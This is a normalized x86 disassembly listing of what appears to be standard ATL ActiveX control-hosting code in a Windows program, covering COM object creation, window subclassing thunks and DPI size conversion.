mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax 0x80004003
test ecx ecx
je r-xdata
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x3c ]
test eax eax
je r-xdata
mov [ ecx ] 0x0
mov eax 0x80040004
mov edx [ eax ]
mov edx [ edx ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push eax
call edx
pop ebp
retn 0xc
sub_405380
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x54 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x54 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_4053c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x58 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x58 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_405400
push ebp
mov ebp esp
push 0xffffffff
push sub_44672a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push 0x0
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_405490
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push edi
mov ecx esi
call edx
cmp [ esi + 0x14 ] 0x0
mov edi eax
jne r-xdata
mov eax [ esi + 0x14 ]
sub edi eax
push 0xd
sub edi 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] edi
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
mov eax [ esi + 0x14 ]
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongW@IAT ]
test eax eax
je r-xdata
call j_sub_443f06
mov [ esi + 0x14 ] eax
test eax eax
je r-xdata
xor eax eax
pop edi
retn
mov [ esi + 0x20 ] eax
mov [ esi + 0x4 ] ebx
mov eax 0x1
pop edi
retn
sub_405500
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
call [ GetParent@IAT ]
push 0x8
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call [ GetClassNameW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp - 0x14 ]
push edx
call [ lstrcmpW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
xor ecx ebp
inc eax
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_405570
push esi
mov esi eax
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ CharNextW@IAT ]
mov edi edi
mov eax r--data
jmp r-xdata
movzx ecx [ eax ]
test cx cx
je r-xdata
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
cmp [ esi ] cx
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push esi
call edi
pop edi
pop esi
retn
push eax
call edi
test eax eax
jne r-xdata
sub_4055c0
push ebp
mov ebp esp
push 0xffffffff
push sub_44668a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] ecx
test edi edi
jne r-xdata
mov [ edi ] 0x0
mov ebx 0x80004005
mov [ eax ] 0x0
test esi esi
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor eax eax
movzx eax [ esi ]
test ax ax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
cmp eax 0x4d
je r-xdata
movzx eax [ esi + 0x2 ]
cmp eax 0x53
je r-xdata
cmp eax 0x6d
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp eax 0x48
je r-xdata
cmp eax 0x73
jne r-xdata
mov eax esi
call sub_405570
test eax eax
je r-xdata
movzx eax [ esi + 0x6 ]
cmp eax 0x54
je r-xdata
cmp eax 0x68
jne r-xdata
push esi
call [ lstrlenW@IAT ]
cmp eax 0xff
jge r-xdata
push edi
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov ebx eax
mov eax [ ebp - 0x28 ]
mov [ eax ] 0x1
mov eax ebx
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp eax 0x4d
je r-xdata
cmp eax 0x74
jne r-xdata
mov eax ebx
jmp r-xdata
cmp [ esi ] 0x7b
jne r-xdata
movzx eax [ esi + 0xa ]
cmp eax 0x4c
je r-xdata
cmp eax 0x6d
jne r-xdata
lea edx [ ebp - 0x24 ]
push edx
push esi
call [ CLSIDFromProgID@IAT ]
lea ecx [ ebp - 0x24 ]
push ecx
push esi
call [ CLSIDFromString@IAT ]
jmp r-xdata
cmp [ esi + 0xc ] 0x3a
jne r-xdata
cmp eax 0x6c
jne r-xdata
mov esi [ ebp - 0x2c ]
push esi
call [ SysStringLen@IAT ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
js r-xdata
push edi
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov edx [ ebp - 0x28 ]
mov [ edx ] 0x1
mov ebx eax
jmp r-xdata
push edi
push r--data
push 0x1
push 0x0
lea eax [ ebp - 0x24 ]
push eax
call [ CoCreateInstance@IAT ]
mov ebx eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x28 ]
push eax
push r--data
push 0x0
push 0x1
lea ecx [ ebp - 0x24 ]
push ecx
call [ CoGetClassObject@IAT ]
mov ebx eax
test ebx ebx
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
push edi
push esi
push r--data
push 0x0
push 0x0
push eax
mov eax [ edx + 0x1c ]
call eax
mov ebx eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax ebx
jmp r-xdata
sub_4057b0
push ebp
mov ebp esp
push 0xffffffff
push sub_446652
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_405800
push ebp
mov ebp esp
sub esp 0x8
test ebx ebx
jne r-xdata
test edi edi
jne r-xdata
push 0x80004003
call sub_402d00
push esi
push 0x0
call [ GetDC@IAT ]
mov esi eax
push 0x58
push esi
call [ GetDeviceCaps@IAT ]
push 0x5a
push esi
mov [ ebp - 0x4 ] eax
call [ GetDeviceCaps@IAT ]
push esi
push 0x0
mov [ ebp - 0x8 ] eax
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebx ]
mov esi [ MulDiv@IAT ]
push eax
push ecx
push 0x9ec
call esi
mov edx [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
push edx
push eax
push 0x9ec
call esi
mov [ edi + 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
push 0x80004003
call sub_402d00
sub_405880
push ebp
mov ebp esp
sub esp 0x8
test ebx ebx
jne r-xdata
test edi edi
jne r-xdata
push 0x80004003
call sub_402d00
push esi
push 0x0
call [ GetDC@IAT ]
mov esi eax
push 0x58
push esi
call [ GetDeviceCaps@IAT ]
push 0x5a
push esi
mov [ ebp - 0x4 ] eax
call [ GetDeviceCaps@IAT ]
push esi
push 0x0
mov [ ebp - 0x8 ] eax
call [ ReleaseDC@IAT ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
mov esi [ MulDiv@IAT ]
push 0x9ec
push eax
push ecx
call esi
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push 0x9ec
push edx
push eax
call esi
mov [ edi + 0x4 ] eax
pop esi
mov esp ebp
pop ebp
retn
push 0x80004003
call sub_402d00
sub_405900
push ebp
mov ebp esp
push 0xffffffff
push sub_4472c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x60 ] ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebx ]
mov edx [ ecx ]
lea edi [ esi + 0x64 ]
push edi
push r--data
push ebx
mov [ ebp - 0x10 ] 0x0
call edx
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x4 ]
push ebx
call ecx
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x21
mov eax [ ebx ]
mov edx [ eax ]
lea ecx [ ebp - 0x1c ]
push ecx
push r--data
push ebx
call edx
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x58 ]
lea ebx [ esi + 0xa0 ]
push ebx
push 0x1
push eax
call edx
test [ ebx ] 0x20000
je r-xdata
mov [ esi + 0x60 ] ebx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov edi [ eax ]
mov ebx eax
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
push eax
mov eax [ edi + 0xc ]
push ebx
call eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ esi + 0xa0 ] 0x20000
jne r-xdata
mov eax [ edi ]
mov [ ebp + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ edi ]
lea ebx [ esi + 0x70 ]
push ebx
mov [ esi + 0x90 ] 0x0
mov ecx [ eax ]
mov edx [ ecx ]
push r--data
push eax
call edx
mov [ ebp - 0x10 ] eax
test eax eax
jns r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ ebp + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x12
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0x90 ] 0x7
jmp r-xdata
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx ]
push ebx
push r--data
push eax
call edx
mov [ ebp - 0x10 ] eax
test eax eax
js r-xdata
mov [ ebp - 0x4 ] 0x13
mov eax [ edi ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x10 ]
mov ecx esi
call edx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x17
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx ]
push ebx
push r--data
push eax
call edx
mov [ ebp - 0x10 ] eax
test eax eax
js r-xdata
mov [ esi + 0x90 ] 0x3
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ edi ]
mov [ ebp + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x20 ]
push eax
call edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x14 ]
call eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x18
mov eax [ edi ]
mov ecx [ eax ]
lea edx [ esi + 0x9c ]
push edx
mov edx [ ebp - 0x14 ]
push edx
push eax
mov eax [ ecx + 0x4c ]
call eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov [ esi + 0x90 ] 0x1
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xa
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov ebx [ ebp - 0x10 ]
test ebx ebx
jns r-xdata
mov edi [ edi ]
mov ecx [ edi ]
mov edx [ ecx + 0x14 ]
push 0x0
push r--data
push edi
call edx
test [ esi + 0xa0 ] 0x400
jne r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebx ]
mov eax [ ecx + 0x1c ]
push edx
push 0x0
push 0x1
push ebx
call eax
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push ebx
push eax
call edx
mov [ ebp - 0x10 ] eax
test [ esi + 0xa0 ] 0x20000
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea edi [ esi + 0xb4 ]
push edi
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0xbc ]
mov edx [ esi + 0xc0 ]
sub ecx [ edi ]
sub edx [ esi + 0xb8 ]
lea ebx [ esi + 0xac ]
lea edi [ esi + 0xa4 ]
mov [ ebx ] ecx
mov [ esi + 0xb0 ] edx
call sub_405800
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0x44 ]
lea ebx [ esi + 0xa4 ]
push ebx
push 0x1
push eax
call edx
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0x48 ]
push ebx
push 0x1
push eax
call edx
lea edi [ esi + 0xac ]
call sub_405880
mov eax [ esi + 0xb4 ]
mov ecx [ esi + 0xb0 ]
add eax [ esi + 0xac ]
add ecx [ esi + 0xb8 ]
mov edx [ esi ]
lea edi [ esi + 0xb4 ]
mov [ esi + 0xbc ] eax
mov eax [ edx + 0x10 ]
mov [ esi + 0xc0 ] ecx
mov ecx esi
call eax
mov [ ebp + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1a
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi + 0xa0 ] 0x0
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push 0x0
push eax
call edx
mov ebx [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1b
mov edx [ esi + 0x4 ]
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
push edi
push edx
mov edx [ ebp + 0xc ]
push 0x0
push edx
push 0x0
push 0xfffffffb
push eax
mov eax [ ecx + 0x2c ]
call eax
mov ecx [ esi + 0x4 ]
push 0x507
push 0x0
push 0x0
push ecx
mov [ ebp - 0x10 ] eax
call [ RedrawWindow@IAT ]
mov [ ebp - 0x4 ] 0x18
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x60 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_405e10
push ebp
mov ebp esp
push 0xffffffff
push sub_4464a4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov esi eax
test esi esi
js r-xdata
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov esi eax
test esi esi
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_405ef0
xor eax eax
push esi
mov [ esi ] ax
call [ VariantClear@IAT ]
test eax eax
jns r-xdata
mov ecx 0x8
push edi
mov [ esi ] cx
call [ SysAllocString@IAT ]
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push eax
call sub_402d00
mov eax esi
retn
test edi edi
je r-xdata
mov edx 0xa
push 0x8007000e
mov [ esi ] dx
mov [ esi + 0x8 ] 0x8007000e
call sub_402d00
sub_405f50
test [ esi + 0xc8 ] 0x10
je r-xdata
mov edx [ esi + 0x4 ]
push edx
call [ DestroyWindow@IAT ]
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call [ GetWindowLongW@IAT ]
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x4 ]
push eax
push 0xfffffffc
push ecx
call [ SetWindowLongW@IAT ]
test eax eax
je r-xdata
retn
mov eax [ esi + 0x4 ]
mov ecx [ DefWindowProcW@IAT ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x4 ] 0x0
test eax eax
je r-xdata
and [ esi + 0xc8 ] 0xffffffef
retn
sub_405fb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_448b90
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
mov ebx 0x1
mov [ esp + 0x17 ] 0x0
mov [ esp + 0x28 ] esi
call sub_40a850
lea eax [ edi - 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0x80004003
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp + 0x10 ]
push eax
call [ IsWindow@IAT ]
test eax eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
mov eax ebx
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ ebp + 0x10 ]
mov ecx [ esp + 0x18 ]
cmp [ ecx ] ebx
je r-xdata
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
call sub_405f50
cmp [ edi + 0xa8 ] 0x0
jne r-xdata
call sub_405490
shl eax 0x4
xor eax [ esi + 0xc8 ]
mov [ esp + 0x17 ] 0x1
and eax 0x10
xor [ esi + 0xc8 ] eax
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x24 ]
mov edi [ ebp + 0x18 ]
lea eax [ esp + 0x16 ]
push eax
mov edx esi
mov [ esp + 0x1a ] 0x0
call sub_4055c0
mov ebx eax
add esp 0x4
test ebx ebx
js r-xdata
mov edx [ esp + 0x18 ]
push edx
call sub_405500
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x5c ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x8 ] edx
mov ecx [ ecx + 0xc ]
mov [ eax + 0xc ] ecx
test ebx ebx
js r-xdata
mov ecx [ ebp + 0x14 ]
mov esi [ esp + 0x28 ]
push ecx
mov edx edi
mov eax [ edx ]
push 0x0
push eax
call sub_405900
mov esi [ ebp + 0xc ]
mov ebx eax
push 0x5
push 0xf
jmp r-xdata
mov esi [ esp + 0x28 ]
call sub_40a850
mov edx [ esp + 0x18 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov edx [ ebp + 0x18 ]
mov ecx [ edx ]
test ecx ecx
je r-xdata
call [ GetSysColor@IAT ]
mov [ edi + 0xa8 ] eax
push 0x507
push 0x0
push 0x0
push eax
call [ RedrawWindow@IAT ]
test ebx ebx
jns r-xdata
cmp [ esp + 0x16 ] 0x0
je r-xdata
mov edx [ ebp + 0x20 ]
test edx edx
je r-xdata
cmp [ esp + 0x17 ] 0x0
je r-xdata
test ebx ebx
js r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
je r-xdata
add edi 0x70
push edi
push eax
push edx
push ecx
call sub_405e10
call sub_405f50
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x3c ] 0x0
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ ecx ]
mov edi [ GetWindowLongW@IAT ]
push 0xfffffff0
push edx
call edi
test eax 0x300000
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ eax ]
push 0xfffffff0
push ecx
call edi
mov edi [ esp + 0x18 ]
mov edx [ edi ]
and eax 0xffcfffff
push eax
push 0xfffffff0
push edx
call [ SetWindowLongW@IAT ]
mov eax [ edi ]
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov eax [ ebp + 0x8 ]
or [ eax + 0xbc ] 0x8
jmp r-xdata
mov [ esp + 0x58 ] 0x1
movzx eax [ esi ]
cmp eax 0x4d
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ ebp + 0x18 ]
mov eax [ ecx ]
mov [ esp + 0x24 ] eax
test eax eax
je r-xdata
movzx eax [ esi + 0x2 ]
cmp eax 0x53
je r-xdata
cmp eax 0x6d
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp eax 0x48
je r-xdata
cmp eax 0x73
jne r-xdata
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x58 ] 0x7
mov eax [ esp + 0x24 ]
mov ecx [ eax ]
lea edx [ esp + 0x1c ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
movzx eax [ esi + 0x6 ]
cmp eax 0x54
je r-xdata
cmp eax 0x68
jne r-xdata
mov [ esp + 0x58 ] 0x1
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
lea ecx [ esp + 0x2c ]
push ecx
call [ VariantInit@IAT ]
mov [ esp + 0x58 ] 0x8
mov edi esi
lea esi [ esp + 0x3c ]
call sub_405ef0
mov [ esp + 0x58 ] 0x9
mov eax [ esp + 0x1c ]
mov edx [ eax ]
push 0xffffffff
push eax
mov eax [ edx + 0xa4 ]
call eax
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
lea edx [ esp + 0x2c ]
push edx
push edx
push edx
push edx
mov edx esi
push edx
push eax
mov eax [ ecx + 0xd0 ]
call eax
mov [ esp + 0x58 ] 0x8
mov ecx esi
mov esi [ VariantClear@IAT ]
push ecx
call esi
mov [ esp + 0x58 ] 0x7
lea edx [ esp + 0x2c ]
push edx
call esi
movzx eax [ esi + 0x8 ]
cmp eax 0x4d
je r-xdata
cmp eax 0x74
jne r-xdata
mov [ esp + 0x58 ] 0xffffffff
lea eax [ esp + 0x24 ]
push eax
call sub_40a500
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
movzx eax [ esi + 0xa ]
cmp eax 0x4c
je r-xdata
cmp eax 0x6d
jne r-xdata
cmp [ esi + 0xc ] 0x3a
jne r-xdata
cmp eax 0x6c
jne r-xdata
push esi
call [ lstrlenW@IAT ]
lea edi [ eax + eax - 0xe ]
push edi
push 0x42
call [ GlobalAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ebx 0x8007000e
jmp r-xdata
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x58 ] 0x3
push esi
call [ GlobalLock@IAT ]
mov ecx [ ebp + 0xc ]
push eax
add ecx 0xe
mov eax edi
mov edx edi
call sub_402480
add esp 0x4
push esi
call [ GlobalUnlock@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x1
push esi
call [ CreateStreamOnHGlobal@IAT ]
mov ebx eax
test ebx ebx
js r-xdata
mov [ esp + 0x58 ] 0x1
lea edx [ esp + 0x20 ]
push edx
call sub_40a500
jmp r-xdata
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x58 ] 0x5
mov eax [ esp + 0x24 ]
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ esp + 0x1c ]
push ecx
push r--data
push eax
call edx
mov ebx eax
test ebx ebx
js r-xdata
mov [ esp + 0x58 ] 0x3
